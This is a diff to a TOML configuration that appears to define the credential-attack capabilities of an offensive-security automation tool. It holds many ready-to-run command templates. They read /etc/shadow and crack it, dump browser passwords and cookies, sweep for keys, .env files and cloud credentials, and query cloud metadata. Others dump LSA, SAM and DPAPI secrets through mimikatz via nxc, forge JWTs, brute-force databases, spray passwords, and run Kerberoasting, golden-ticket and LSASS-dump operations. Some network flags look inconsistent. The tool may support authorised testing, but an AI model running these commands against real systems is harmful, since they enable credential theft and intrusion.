+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Archive Size Check'
+args = ['-la', '{archive}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'unzip'
+[[capability.provider.operation]]
+name = 'Archive Content List'
+args = ['-l', '{archive}', '-P', 'password']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.credential-dump-linux'
+phase = 'credentials'
+label = 'CREDENTIAL DUMP LINUX'
+summary = 'Harvest local Linux credential material and keychains'
+inputs = [
+  { key = 'path', type = 'path', required = false, default = '/home' },
+]
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Shadow Read'
+args = ['/etc/shadow']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Passwd Read'
+args = ['/etc/passwd']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'unshadow'
+[[capability.provider.operation]]
+name = 'Unshadow Combine'
+args = ['/etc/passwd', '/etc/shadow', '>', '/tmp/unshadow.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'Shadow Crack'
+args = ['--wordlist=/usr/share/wordlists/rockyou.txt', '/tmp/unshadow.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Git Config Cred Scan'
+args = ['-riE', 'user|password|token', '{path}/.gitconfig', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Netrc Dump'
+args = ['{path}/.netrc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Keyring Locate'
+args = ['{path}', '-name', '*.keyring', '-o', '-name', 'kwallet*', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'MySQL History Dump'
+args = ['{path}/.mysql_history']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'PSQL History Dump'
+args = ['{path}/.psql_history']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Firefox Profile Locate'
+args = ['{path}', '-name', 'logins.json', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Chrome Login Data Check'
+args = ['{path}/.config/google-chrome/Default/Login Data']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'WP Config Creds'
+args = ['-rE', 'DB_PASSWORD|DB_USER', '/var/www/', '2>/dev/null']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.windows-credential-sweep'
+phase = 'credentials'
+label = 'WINDOWS CREDENTIAL SWEEP'
+summary = 'Enumerate Windows credential stores and saved secrets'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+]
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Credential Guard Check'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'lsassy']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'LSA Dump'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--lsa']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'DPAPI Dump'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--dpapi']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Mimikatz Cred Man'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'mimikatz', '-o', 'COMMAND=sekurlsa::credman']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Mimikatz Lsa Dump'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'mimikatz', '-o', 'COMMAND=lsadump::sam']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-secretsdump'
+[[capability.provider.operation]]
+name = 'Remote SAM Pull'
+args = ['{rhost}/{username}:{password}', '-sam', 'SAM', '-system', 'SYSTEM', '-ntds', 'ntds.dit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'WinRM Cred Test'
+args = ['winrm', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'MSSQL Cred Test'
+args = ['mssql', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'LDAP Cred Test'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'VNC Cred Test'
+args = ['vnc', '{rhost}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'FTP Cred Test'
+args = ['ftp', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'crackmapexec'
+[[capability.provider.operation]]
+name = 'Compat LSA'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--lsa']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'credentials.keystores-cert-pull'
+phase = 'credentials'
+label = 'KEYSTORES CERT PULL'
+summary = 'Extract keys, certs and keystore secrets from filesystems'
+inputs = [
+  { key = 'path', type = 'path', required = false, default = '/' },
+]
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'PEM Key Sweep'
+args = ['{path}', '-name', '*.pem', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Keystore Sweep'
+args = ['{path}', '-name', '*.jks', '-o', '-name', '*.keystore', '-o', '-name', '*.pfx', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'PKI Dir Locate'
+args = ['{path}', '-name', 'private', '-path', '*etc/ssl*', '-type', 'd', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'openssl'
+[[capability.provider.operation]]
+name = 'Key RSA Inspect'
+args = ['rsa', '-in', '/etc/ssl/private/ssl-cert-snakeoil.key', '-noout', '-text']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'openssl'
+[[capability.provider.operation]]
+name = 'Cert Inspect'
+args = ['x509', '-in', '/etc/ssl/certs/ssl-cert-snakeoil.pem', '-noout', '-text']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'keytool'
+[[capability.provider.operation]]
+name = 'JKS List'
+args = ['-list', '-v', '-keystore', 'keystore.jks']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'openssl'
+[[capability.provider.operation]]
+name = 'PKCS12 Inspect'
+args = ['pkcs12', '-in', 'cert.pfx', '-passin', 'pass:', '-nokeys', '-info']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Key Header Find'
+args = ['-rl', 'BEGIN PRIVATE KEY', '{path}/etc/', '{path}/home/', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'SSL Dir Listing'
+args = ['-la', '/etc/ssl/private/', '/etc/ssl/certs/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'openssl'
+[[capability.provider.operation]]
+name = 'DH Param Inspect'
+args = ['dhparam', '-in', '/etc/ssl/dhparam.pem', '-noout', '-text']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'GPG Key Locate'
+args = ['{path}', '-name', '*.gpg', '-o', '-name', 'secring.gpg', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'gpg'
+[[capability.provider.operation]]
+name = 'GPG Keyring List'
+args = ['--list-keys']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.browser-password-extract'
+phase = 'credentials'
+label = 'BROWSER PASSWORD EXTRACT'
+summary = 'Extract saved passwords from browser credential stores'
+inputs = [
+  { key = 'path', type = 'path', required = false, default = '/home' },
+]
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Chrome Login Data Find'
+args = ['{path}', '-name', 'Login Data', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Firefox Logins Find'
+args = ['{path}', '-name', 'logins.json', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Key4 Find'
+args = ['{path}', '-name', 'key4.db', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Chrome Decrypt Run'
+args = ['chrome_decrypt.py', '--db', '{path}/.config/google-chrome/Default/Login Data']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Firefox Decrypt Run'
+args = ['firefox_decrypt.py', '{path}/.mozilla/firefox/']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Chrome Profile List'
+args = ['-la', '{path}/.config/google-chrome/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Firefox Profile List'
+args = ['-la', '{path}/.mozilla/firefox/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Cookies DB Check'
+args = ['{path}/.config/google-chrome/Default/Cookies']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'strings'
+[[capability.provider.operation]]
+name = 'Login Data Strings'
+args = ['{path}/.config/google-chrome/Default/Login Data']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Chromium Profile Find'
+args = ['{path}', '-name', 'Chromium', '-type', 'd', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Brave Profile List'
+args = ['-la', '{path}/.config/BraveSoftware/Brave-Browser/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Edge Profile List'
+args = ['-la', '{path}/.config/microsoft-edge/']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.secret-scan-filesystem'
+phase = 'credentials'
+label = 'SECRET SCAN FILESYSTEM'
+summary = 'Sweep the filesystem for embedded secrets and API keys'
+inputs = [
+  { key = 'path', type = 'path', required = false, default = '/home' },
+]
+[[capability.provider]]
+binary = 'gitleaks'
+[[capability.provider.operation]]
+name = 'Dir Secret Scan'
+args = ['detect', '--source', '{path}', '--no-git', '--report-format', 'json', '--report-path', '/tmp/leaks.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'trufflehog'
+[[capability.provider.operation]]
+name = 'Filesystem Scan'
+args = ['filesystem', '--directory={path}', '--json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'AWS Key Pattern'
+args = ['-rE', 'AKIA[0-9A-Z]{{16}}', '{path}', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Private Key Pattern'
+args = ['-rl', 'BEGIN RSA PRIVATE KEY', '{path}', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Generic Secret Pattern'
+args = ['-rE', '(api_key|apikey|secret|token).{0,20}', '{path}', '--include=*.py', '--include=*.js', '--include=*.php', '--include=*.yml', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Slack Token Pattern'
+args = ['-rE', 'xox[baprs]-[0-9A-Za-z-]+', '{path}', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'JWT Pattern'
+args = ['-rE', 'eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+', '{path}', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Google API Pattern'
+args = ['-rE', 'AIza[0-9A-Za-z_-]{35}', '{path}', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Twilio Key Pattern'
+args = ['-rE', 'SK[0-9a-fA-F]{32}', '{path}', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Dotenv File Sweep'
+args = ['{path}', '-name', '.env', '-o', '-name', '.env.*', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Config File Sweep'
+args = ['{path}', '-name', 'settings.py', '-o', '-name', 'config.json', '-o', '-name', 'appsettings.json', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Db URL Pattern'
+args = ['-rE', '(postgres|mysql|mongodb|redis)://[^\\s]+:[^\\s]+@', '{path}', '2>/dev/null']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.cloud-credential-probe'
+phase = 'credentials'
+label = 'CLOUD CREDENTIAL PROBE'
+summary = 'Enumerate cloud credential files and unauthenticated cloud APIs'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'bucket', type = 'text', required = false, default = '' },
+]
+[[capability.provider]]
+binary = 'aws'
+[[capability.provider.operation]]
+name = 'S3 Anonymous List'
+args = ['s3', 'ls', 's3://{bucket}', '--no-sign-request']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'aws'
+[[capability.provider.operation]]
+name = 'S3 Anonymous Get Test'
+args = ['s3', 'cp', 's3://{bucket}/', '/tmp/probe_out/', '--recursive', '--no-sign-request', '--dryrun']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'S3 URL Anonymous Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'https://{bucket}.s3.amazonaws.com/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Azure Blob Anonymous Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'https://{bucket}.blob.core.windows.net/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GCS Anonymous Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'https://{bucket}.storage.googleapis.com/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Metadata IMDSv1 Probe'
+args = ['-sk', '--connect-timeout', '3', '-H', 'X-aws-ec2-metadata-token: ', 'http://169.254.169.254/latest/meta-data/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Metadata Role Name'
+args = ['-sk', '--connect-timeout', '3', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Metadata Token Fetch'
+args = ['-sk', '--connect-timeout', '3', '-X', 'PUT', '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 60', 'http://169.254.169.254/latest/api/token']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'AWS Creds Read'
+args = ['/home/*/.aws/credentials']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'GCP Creds Read'
+args = ['/home/*/.config/gcloud/application_default_credentials.json']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Azure Creds Read'
+args = ['/home/*/.azure/accessTokens.json']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'env'
+[[capability.provider.operation]]
+name = 'Cloud Env Vars'
+args = []
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.jwt-token-audit'
+phase = 'credentials'
+label = 'JWT TOKEN AUDIT'
+summary = 'Decode, verify and attack JWT implementations'
+inputs = [
+  { key = 'token', type = 'text', required = true },
+  { key = 'url', type = 'url', required = true },
+]
+[[capability.provider]]
+binary = 'echo'
+[[capability.provider.operation]]
+name = 'JWT Payload Decode'
+args = '{token.split(".")[1]} | base64 -d 2>/dev/null'
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'JWT HS256 Crack'
+args = ['-m', '16500', '-a', '0', '/tmp/jwt.hash', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'JWT None Mode'
+args = ['-m', '16511', '-a', '3', '/tmp/jwt_none.hash', '?a?a?a', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'JWT Forgery Run'
+args = ['jwt_forgery.py', '--token', '{token}', '--url', '{url}']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'None Alg Bypass Test'
+args = ['-sk', '-H', 'Authorization: Bearer {token}', '{url}/api/user']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Kid Injection Probe'
+args = ['-sk', '-H', 'Authorization: Bearer eyJhbGciOiJub25lIiwia2lkIjoia2V5In0.', '{url}/api/user']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Alg Confusion Probe'
+args = ['-sk', '-H', 'Authorization: Bearer {token}', '{url}/api/admin']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'JWT Vuln Templates'
+args = ['-u', '{url}', '-tags', 'jwt,auth', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'base64'
+[[capability.provider.operation]]
+name = 'Header Decode Manual'
+args = ['-d']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'openssl'
+[[capability.provider.operation]]
+name = 'RSA Pubkey Extract'
+args = ['rsa', '-pubin', '-in', 'public.pem', '-noout', '-text']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'JWKS Endpoint Probe'
+args = ['-sk', '{url}/.well-known/jwks.json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'JWT Source Pattern'
+args = ['-rE', 'jwt|jsonwebtoken|jose', '/var/www/', '2>/dev/null']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.database-cred-test'
+phase = 'credentials'
+label = 'DATABASE CRED TEST'
+summary = 'Test and abuse database authentication across engines'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = false, default = 'root' },
+  { key = 'password', type = 'password', required = false, default = '' },
+  { key = 'passlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
+]
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'MSSQL Cred Test'
+args = ['mssql', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'MSSQL Brute'
+args = ['mssql', '{rhost}', '-u', 'sa', '-p', '{passlist}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'MSSQL Query Exec'
+args = ['mssql', '{rhost}', '-u', '{username}', '-p', '{password}', '-q', 'SELECT @@version']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'mysql'
+[[capability.provider.operation]]
+name = 'MySQL Connect Test'
+args = ['-h', '{rhost}', '-u', '{username}', '-p{password}', '-e', 'select 1;']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'MySQL Brute'
+args = ['-l', 'root', '-P', '{passlist}', '{rhost}', 'mysql']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'Postgres Brute'
+args = ['-l', 'postgres', '-P', '{passlist}', '{rhost}', 'postgres']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'psql'
+[[capability.provider.operation]]
+name = 'Postgres Connect Test'
+args = ['-h', '{rhost}', '-U', 'postgres', '-c', 'select 1;']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'redis-cli'
+[[capability.provider.operation]]
+name = 'Redis Connect Test'
+args = ['-h', '{rhost}', 'ping']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'redis-cli'
+[[capability.provider.operation]]
+name = 'Redis Auth Test'
+args = ['-h', '{rhost}', '-a', '{password}', 'ping']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'mongo'
+[[capability.provider.operation]]
+name = 'Mongo Connect Test'
+args = ['--host', '{rhost}', '--eval', 'db.version()']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Mongo Script Sweep'
+args = ['-sV', '-p', '27017', '--script', 'mongodb-info', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'MSSQL Script Sweep'
+args = ['-sV', '-p', '1433', '--script', 'ms-sql-info,ms-sql-empty-password', '{rhost}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'credentials.credential-reuse-test'
+phase = 'credentials'
+label = 'CREDENTIAL REUSE TEST'
+summary = 'Test recovered credentials against multiple protocols and hosts'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+  { key = 'hash', type = 'text', required = false, default = '' },
+]
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'SMB Cred Test'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'WinRM Cred Test'
+args = ['winrm', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'MSSQL Cred Test'
+args = ['mssql', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'LDAP Cred Test'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'FTP Cred Test'
+args = ['ftp', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'SSH Cred Test'
+args = ['ssh', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'SMB Hash Test'
+args = ['smb', '{rhost}', '-u', '{username}', '-H', '{hash}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'WinRM Hash Test'
+args = ['winrm', '{rhost}', '-u', '{username}', '-H', '{hash}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'MSSQL Hash Test'
+args = ['mssql', '{rhost}', '-u', '{username}', '-H', '{hash}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'SSH Cred Test'
+args = ['-o', 'StrictHostKeyChecking=no', '-o', 'PreferredAuthentications=password', '{username}@{rhost}', 'id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'crackmapexec'
+[[capability.provider.operation]]
+name = 'Compat Cred Test'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'evil-winrm'
+[[capability.provider.operation]]
+name = 'WinRM Shell Test'
+args = ['-i', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'credentials.wordlist-preparation'
+phase = 'credentials'
+label = 'WORDLIST PREPARATION'
+summary = 'Generate and mutate targeted wordlists for brute force campaigns'
+inputs = [
+  { key = 'domain', type = 'domain', required = false, default = '' },
+  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
+]
+[[capability.provider]]
+binary = 'cewl'
+[[capability.provider.operation]]
+name = 'Site Keyword Pull'
+args = ['-d', '2', '-m', '4', '-w', '/tmp/cewl_out.txt', 'https://{domain}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Rule Mutate Best64'
+args = ['-r', '/usr/share/hashcat/rules/best64.rule', '{wordlist}', '--stdout']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Rule Mutate Dive'
+args = ['-r', '/usr/share/hashcat/rules/dive.rule', '{wordlist}', '--stdout']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'crunch'
+[[capability.provider.operation]]
+name = 'Pattern Generate'
+args = ['6', '10', 'abcde12345', '-o', '/tmp/gen.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'maskprocessor'
 [[capability.provider.operation]]
 name = 'Mask Generate'
-args = ['-1', '?l?d', '?1?1?1?1?1?1']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'credentials.kerberos-attacks'
-phase = 'credentials'
-label = 'KERBEROS ATTACKS'
-summary = 'Kerberoasting, AS-REP roasting and ticket forgery'
-inputs = [
-  { key = 'target', type = 'target', required = true },
-  { key = 'domain', type = 'domain', required = true },
-  { key = 'username', type = 'username', required = false },
-  { key = 'password', type = 'password', required = false },
-]
-[[capability.provider]]
-binary = 'impacket-GetUserSPNs'
-[[capability.provider.operation]]
-name = 'Kerberoast Request'
-args = ['{domain}/{username}', '-dc-ip', '{target}', '-request', '-outputfile', 'kerberoast.txt']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'impacket-GetNPUsers'
-[[capability.provider.operation]]
-name = 'ASREP Roast'
-args = ['{domain}/', '-usersfile', 'users.txt', '-format', 'hashcat', '-outputfile', 'asreproast.txt', '-dc-ip', '{target}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'kerbrute'
-[[capability.provider.operation]]
-name = 'User Enumeration'
-args = ['userenum', '--dc', '{target}', '-d', '{domain}', 'names.txt']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Password Spray'
-args = ['passwordspray', '--dc', '{target}', '-d', '{domain}', 'users.txt', 'Summer2026!']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'impacket-ticketer'
-[[capability.provider.operation]]
-name = 'Golden Ticket'
-args = ['-nthash', 'HASH', '-domain-sid', 'S-1-5-21', '-domain', '{domain}', 'administrator']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Silver Ticket'
-args = ['-spn', 'cifs/host.{domain}', '-nthash', 'HASH', '-domain', '{domain}', 'administrator']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'credentials.memory-extraction'
-phase = 'credentials'
-label = 'MEMORY EXTRACTION'
-summary = 'Dump process memory for offline credential recovery'
-inputs = [
-  { key = 'pid', type = 'integer', required = false, default = '684' },
-]
-[[capability.provider]]
-binary = 'procdump'
-[[capability.provider.operation]]
-name = 'LSASS Dump'
-args = ['-accepteula', '-ma', 'lsass.exe', 'lsass.dmp']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'nanodump'
-[[capability.provider.operation]]
-name = 'Syscall Dump'
-args = ['--write', 'lsass.dmp', '--use-syscalls']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Fork Dump'
-args = ['--pid', '{pid}', '--fork', '--valid']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'handlekatz'
-[[capability.provider.operation]]
-name = 'Handle Clone'
-args = ['--output', 'out.dmp']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'sqldumper'
-[[capability.provider.operation]]
-name = 'LOLBAS Dump'
-args = ['{pid}', '0', '0x01100', '0', '/tmp/']
